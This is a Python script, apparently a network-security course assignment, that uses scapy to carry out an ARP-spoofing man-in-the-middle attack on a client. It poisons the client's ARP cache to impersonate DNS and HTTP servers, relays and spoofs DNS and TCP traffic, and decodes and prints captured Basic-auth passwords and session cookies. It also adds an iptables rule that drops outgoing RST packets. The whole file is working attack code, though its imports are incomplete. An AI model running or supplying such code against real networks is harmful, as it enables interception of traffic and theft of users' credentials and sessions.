import argparse
import atexit
import base64

from scapy.all import ARP, Ether, DNS, IP, UDP, TCP, DNS
from scapy.all import conf, get_if_hwaddr, srp1, send, sendp, sniff, packet
from scapy.layers.http import HTTP, HTTPResponse, HTTPRequest, http_request, TCP_client


class MyArpSpoofing:

    def __init__(self, interface, client_ip, dns_ip, http_ip):
        # set scapy config
        conf.iface = self.interface = interface
        # set mac/ip
        self.attacker_ip = [e[4] for e in scapy.all.conf.route.routes if e[3] == interface][0]
        self.attacker_mac = get_if_hwaddr(interface)
        self.client_ip = client_ip
        self.client_mac = self._get_mac_by_ip(target_ip=client_ip)
        self.dns_ip = dns_ip
        self.dns_mac = self._get_mac_by_ip(target_ip=dns_ip)
        self.http_ip = http_ip
        self.http_mac = self._get_mac_by_ip(target_ip=http_ip)
        # this command will disable system network process,
        # which allow scapy to do packet level TCP handshake
        cmd1 = f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 10.4.22.208 -j DROP"
        os.system(cmd1)
        # resume client's arp cache on exit
        atexit.register(self._resume_client_arp_cache)

    def run(self):
        """(blocking) sniff and manipulate target packet"""
        self._poison_client_arp_cache()

        def interceptor(p):
            """handler of intercepted packets"""
            # APR packet
            if p.haslayer(ARP) and p[ARP].op == 1:
                self._poison_client_arp_cache()
            # UDP/DNS packet
            elif p.haslayer(DNS):
                (hostname, hostaddr) = self._mitm_dns_query(p=p, timeout=2)
                print(f"*hostname:{hostname}")
                if hostaddr is not None:
                    print(f"*hostaddr:{hostaddr}")
                else:
                    print(f"# [error] dns response timeout")
            # TCP/HTTP handshake (SYN) packet
            elif p.haslayer(TCP) and str(p[TCP].flags) == "S" and \
                    p[IP].src == self.client_ip and p[IP].dst == self.http_ip:
                self._mitm_tcp_handshake(p)
            # HTTP Request packet
            elif p.haslayer(TCP) and p.haslayer(HTTPRequest):
                (auth, cookie) = self._mitm_http_req(p)
                auth = auth.decode("ascii") if type(auth) == bytes else auth
                auth = auth.replace("Basic", "").strip() if type(auth) == str else auth
                auth = base64.b64decode(auth).decode("ascii").strip() if type(auth) == str else auth
                auth = auth.split(":")[1] if type(auth) == str and ":" in auth else auth
                cookie = cookie.decode("ascii") if type(cookie) == bytes else cookie
                cookie = MyUtil.get_cookie(cookie, "session") if type(cookie) is str else cookie
                print(f"*basicauth:{auth}")
                print(f"*cookie:{cookie}")
            # FIN (connection teardown)
            elif p.haslayer(TCP) and str(p[TCP].flags) == "FA":
                self._poison_client_arp_cache(verbose=False)
                l2_l3 = Ether(src=self.attacker_mac, dst=self.client_mac) / \
                        IP(src=self.http_ip, dst=self.client_ip)
                ack = TCP(dport=p[TCP].sport, sport=p[TCP].dport, flags="A", seq=p.ack, ack=p.seq + 1)
                sendp(l2_l3 / ack, verbose=False)

        # run
        print("# start sniffing...")
        f = f"(ether src {self.client_mac}) or (src host {self.http_ip})"
        sniff(prn=interceptor, filter=f, count=65536)

    def _poison_client_arp_cache(self, verbose=True):
        """poison client's arp cache"""
        spoof_dns_arp = ARP(op=2, hwdst=self.client_mac, pdst=self.client_ip, psrc=self.dns_ip)
        send(spoof_dns_arp, verbose=False)
        spoof_http_arp = ARP(op=2, hwdst=self.client_mac, pdst=self.client_ip, psrc=self.http_ip)
        send(spoof_http_arp, verbose=False)
        if verbose is True:
            print("# ARP Cache is poisoned!")

    def _resume_client_arp_cache(self, verbose=True):
        """resume client's arp cache """
        normal_dns_arp = ARP(op=2, hwdst=self.client_mac, pdst=self.client_ip, psrc=self.dns_ip, hwsrc=self.dns_mac)
        send(normal_dns_arp, verbose=False)
        normal_http_arp = ARP(op=2, hwdst=self.client_mac, pdst=self.client_ip, psrc=self.http_ip, hwsrc=self.http_mac)
        send(normal_http_arp, verbose=False)
        if verbose is True:
            print("# ARP Cache is resumed!")

    def _mitm_dns_query(self, p, timeout=5):
        """proxy dns query between client and dns server,
        return (hostname, hostaddr)"""
        # forward dns request from client
        hostname = p[DNS].qd.qname.decode(encoding='ascii')[:-1]
        fake_dns_req = Ether() / IP(dst=self.dns_ip) / UDP() / p[DNS]
        res = srp1(fake_dns_req, verbose=False, timeout=timeout)
        if res is None:
            return hostname, None
        # forward dns response from dns server
        fake_dns_res = Ether() / IP(dst=self.client_ip, src=self.dns_ip) / UDP(dport=p[UDP].sport) / res[DNS]
        sendp(fake_dns_res, verbose=False)
        # return
        hostaddr = res[DNS].an.rdata if res[DNS].an is not None else None
        try:
            hostaddr = hostaddr.decode(encoding="ascii")
        except Exception:
            pass
        return hostname, hostaddr

    def _mitm_tcp_handshake(self, syn):
        """make fake tcp handshake, client would believe it are handshaking with http server,
        but it is the attacker who responses"""
        l2_l3 = Ether(src=self.attacker_mac, dst=self.client_mac) / IP(src=self.http_ip, dst=self.client_ip)
        syn_ack = TCP(dport=syn[TCP].sport, sport=syn[TCP].dport, flags="SA",
                      seq=syn.seq, ack=syn.seq + 1, )
        sendp(l2_l3 / syn_ack, verbose=False)

    def _mitm_http_req(self, http_req):
        """do proxy http request, intercept auth and cookie info
        return (auth, cookie[session]) in bytes"""
        # response ack first
        l2_l3 = Ether(src=self.attacker_mac, dst=self.client_mac) / IP(src=self.http_ip, dst=self.client_ip)
        ack = TCP(dport=http_req[TCP].sport, sport=http_req[TCP].dport, flags="A",
                  seq=http_req.ack, ack=http_req.seq + 1)
        sendp(l2_l3 / ack, verbose=False)
        # send proxy request
        ip = http_req[HTTPRequest].Host.decode(encoding="ascii")
        port = http_req[TCP].dport
        proxy_http_req = HTTP() / http_req[HTTPRequest]
        http_res = TCP_client.tcplink(proto=HTTP, ip=ip, port=port).sr1(proxy_http_req, verbose=False)
        # forward http response to client
        res = http_res[HTTP] / http_res[HTTPResponse]
        sendp(l2_l3 / ack / res, verbose=False)
        # return
        authorization = http_req[HTTPRequest].Authorization
        cookie = res[HTTPResponse].Set_Cookie
        return authorization, cookie

    def _get_mac_by_ip(self, target_ip):
        """get mac address of an IP by arp query """
        ether = Ether(src=self.attacker_mac, dst="ff:ff:ff:ff:ff:ff")  # ff:ff:ff:ff:ff:ff is the addr for broadcast
        arp_packet = ARP(op=1, hwsrc=self.attacker_mac, psrc=self.attacker_ip, pdst=target_ip)
        arp_response = srp1(ether / arp_packet, verbose=False)
        return arp_response.src


class MyUtil:

    @staticmethod
    def get_args():
        """parse terminal args"""
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", dest="i", required=True)
        parser.add_argument("--clientIP", dest="c", required=True)
        parser.add_argument("--dnsIP", dest="d", required=True)
        parser.add_argument("--httpIP", dest="h", required=True)
        args = parser.parse_args()
        # return
        interface = args.i
        client_ip = args.c
        dns_ip = args.d
        http_ip = args.h
        return interface, client_ip, dns_ip, http_ip

    @staticmethod
    def get_cookie(string, key):
        if key not in string:
            return None
        li = [e.strip() for e in string.split(";")]
        for e in li:
            k = e.split("=")[0].strip()
            if k == key:
                return e.split("=")[1].strip()
        return None


if __name__ == "__main__":
    """example command: python3 p.py -i eth0 --clientIP 10.4.22.53 --dnsIP 10.4.22.247 --httpIP 10.4.22.81"""
    INTERFACE, CLIENT_IP, DNS_IP, HTTP_IP = MyUtil.get_args()
    # print report
    arpSpoofing = MyArpSpoofing(interface=INTERFACE, client_ip=CLIENT_IP, dns_ip=DNS_IP, http_ip=HTTP_IP)
    print(f"# ")
    print(f"# ==================== running 4-2-1.py ====================")
    print(f"#")
    print(f"# args")
    print(f"#   INTERFACE : {INTERFACE}")
    print(f"#   CLIENT_IP : {CLIENT_IP}")
    print(f"#   DNS_IP    : {DNS_IP}")
    print(f"#   HTTP_IP   : {HTTP_IP}")
    print(f"#")
    print(f"# Normal MAC/IP Mapping")
    print(f"#   Attacker : {arpSpoofing.attacker_mac}{' ' * 4}{arpSpoofing.attacker_ip}")
    print(f"#   Client   : {arpSpoofing.client_mac}{' ' * 4}{arpSpoofing.client_ip}")
    print(f"#   DNS      : {arpSpoofing.dns_mac}{' ' * 4}{arpSpoofing.dns_ip}")
    print(f"#   HTTP     : {arpSpoofing.http_mac}{' ' * 4}{arpSpoofing.http_ip}")
    print(f"# ==========================================================")
    # run
    arpSpoofing.run()
